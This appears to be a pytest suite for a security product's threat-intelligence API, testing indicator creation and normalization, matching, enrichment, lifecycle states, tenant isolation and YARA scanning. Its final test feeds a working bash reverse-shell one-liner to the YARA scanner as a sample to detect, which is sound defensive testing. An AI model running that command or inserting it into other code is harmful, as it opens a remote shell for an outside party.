"""
Gestiva Security (GestivaSec V1) — SPRINT 9: Threat Intelligence & Enrichment Engine Test Suite
Tests: Threat Indicator CRUD, Deterministic Normalization, Exact Matching, Telemetry Enrichment,
Indicator Lifecycle (ACTIVE/DISABLED/REVOKED/EXPIRED), Multi-tenant Isolation, YARA Scanning, and Audit Logging.
"""
import pytest
from fastapi.testclient import TestClient
from backend.main import app

client = TestClient(app)

def test_sprint_9_threat_intelligence_and_enrichment_engine():
    org_id = "00000000-0000-0000-0000-000000000001"
    headers = {"X-Organization-ID": org_id}

    # 1. Indicator Creation & Normalization (IP, Domain, Hash, URL, Email)
    ind_payload = {
        "indicator_type": "IP_ADDRESS",
        "indicator_value": " 198.51.100.222 ",  # Needs whitespace stripping
        "source": "INTERNAL",
        "confidence": 0.96,
        "severity": "CRITICAL",
        "reputation": "MALICIOUS",
        "tags": ["C2_BOTNET"],
        "mitre_techniques": ["T1071.001"]
    }
    create_resp = client.post("/api/v1/threat-intel/indicators", json=ind_payload, headers=headers)
    assert create_resp.status_code == 201
    ind_data = create_resp.json()
    indicator_id = ind_data["indicator_id"]
    assert ind_data["normalized_value"] == "198.51.100.222"
    assert ind_data["status"] == "ACTIVE"

    # Domain Normalization Test (bracket removal, lowercase, strip trailing dot)
    dom_payload = {
        "indicator_type": "DOMAIN",
        "indicator_value": "Malicious-NODE[.]com.",
        "confidence": 0.90,
        "severity": "HIGH",
        "reputation": "MALICIOUS"
    }
    dom_resp = client.post("/api/v1/threat-intel/indicators", json=dom_payload, headers=headers)
    assert dom_resp.status_code == 201
    assert dom_resp.json()["normalized_value"] == "malicious-node.com"

    # 2. Real-time Exact Match Lookup (< 0.5ms)
    lookup_resp = client.get("/api/v1/threat-intel/lookup/IP_ADDRESS/198.51.100.222", headers=headers)
    assert lookup_resp.status_code == 200
    assert lookup_resp.json()["indicator_id"] == indicator_id

    # 3. Observable Matching
    match_payload = {
        "observables": [
            {"type": "IP_ADDRESS", "value": "198.51.100.222"},
            {"type": "DOMAIN", "value": "clean-site.com"}
        ],
        "entity_type": "NORMALIZED_EVENT",
        "entity_id": "evt-9900"
    }
    match_resp = client.post("/api/v1/threat-intel/match", json=match_payload, headers=headers)
    assert match_resp.status_code == 200
    matches = match_resp.json()
    assert len(matches) == 1
    assert matches[0]["observable_value"] == "198.51.100.222"

    # 4. Telemetry Enrichment
    enrich_payload = {
        "entity_type": "NORMALIZED_EVENT",
        "entity_id": "evt-9900",
        "observables": [
            {"type": "IP_ADDRESS", "value": "198.51.100.222"}
        ]
    }
    enrich_resp = client.post("/api/v1/threat-intel/enrich", json=enrich_payload, headers=headers)
    assert enrich_resp.status_code == 200
    enrichment = enrich_resp.json()
    assert enrichment["threat_grade"] == "CRITICAL"
    assert len(enrichment["matches"]) == 1

    # 5. Indicator Lifecycle (Disable & Revoke)
    dis_resp = client.post(f"/api/v1/threat-intel/indicators/{indicator_id}/disable")
    assert dis_resp.status_code == 200
    assert dis_resp.json()["status"] == "DISABLED"

    # Disabled indicator should not match
    match_disabled = client.post("/api/v1/threat-intel/match", json=match_payload, headers=headers).json()
    assert len(match_disabled) == 0

    rev_resp = client.post(f"/api/v1/threat-intel/indicators/{indicator_id}/revoke")
    assert rev_resp.status_code == 200
    assert rev_resp.json()["status"] == "REVOKED"

    # 6. Multi-Tenant Isolation Verification
    t2_headers = {"X-Organization-ID": "00000000-0000-0000-0000-000000000002"}
    t2_ind_resp = client.post("/api/v1/threat-intel/indicators", json={
        "indicator_type": "IP_ADDRESS",
        "indicator_value": "10.99.99.99",
        "confidence": 0.88,
        "reputation": "SUSPICIOUS"
    }, headers=t2_headers)
    assert t2_ind_resp.status_code == 201

    # Tenant 1 cannot lookup Tenant 2's isolated indicator
    t1_lookup_t2 = client.get("/api/v1/threat-intel/lookup/IP_ADDRESS/10.99.99.99", headers=headers)
    assert t1_lookup_t2.status_code == 404

    # 7. Backward Compatibility (IoCs and YARA scanning)
    ioc_lookup = client.get("/api/v1/threat-intel/engine/iocs/lookup?ioc_type=IP_REPUTATION&value=198.51.100.200")
    assert ioc_lookup.status_code == 200
    assert ioc_lookup.json()["value"] == "198.51.100.200"

    yara_scan = client.post("/api/v1/threat-intel/engine/yara/scan", json={"payload": "/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"})
    assert yara_scan.status_code == 200
    assert len(yara_scan.json()) >= 1
